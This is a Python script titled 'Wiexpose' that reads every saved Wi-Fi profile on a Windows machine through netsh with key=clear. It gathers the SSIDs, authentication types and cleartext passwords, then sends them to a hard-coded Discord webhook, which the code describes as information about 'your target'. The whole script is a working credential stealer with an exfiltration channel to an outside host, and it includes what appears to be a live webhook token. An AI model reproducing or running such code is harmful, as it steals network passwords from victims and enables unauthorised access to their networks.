import subprocess
from prettytable import PrettyTable

from discord_webhook import DiscordWebhook, DiscordEmbed


webhookUrl = 'https://discord.com/api/webhooks/1070422609818300476/L0Buv-xPNpyYNbNNTOS07xC-a168Wd15QGvVEo3JB_2n_DpQVYl98QS04I8H8VxhxRCt'

embed = DiscordEmbed(
    title= "Wiexpose",
    description = "Show information about networks your target has been connected to",
    color='6a329f'
)
if webhookUrl == '':
    print("\nPlease specify your webhook url in the script")
else:
    showProfiles = subprocess.run('netsh wlan show profiles', shell=True, capture_output = True).stdout.decode('utf-8').split('\n')

    profiles = [i.split(":")[1][1:-1] for i in showProfiles if "All User Profile" in i]

    cmdTable = PrettyTable([f'SSID name', 'Authentication', 'Password'])
    for profile in profiles:
        profileInfo = subprocess.run(f'netsh wlan show profile {profile} key=clear', shell=True, capture_output=True).stdout.decode('utf-8').split('\n')
    
        pwd = [i.split(':')[1][1:-1] for i in profileInfo if "Key Content" in i]
        authType = [i.split(':')[1][1:-1] for i in profileInfo if "Authentication" in i]
        cmdTable.add_row([profile, authType[0], pwd[0]])

        embed.add_embed_field(name=profile, value=f'Auth - *{authType[0]}*\nPwd - *{pwd[0]}*', inline=False)

    print(cmdTable)

    webhook = DiscordWebhook(url=webhookUrl)
    webhook.add_embed(embed)
    webhook.execute()

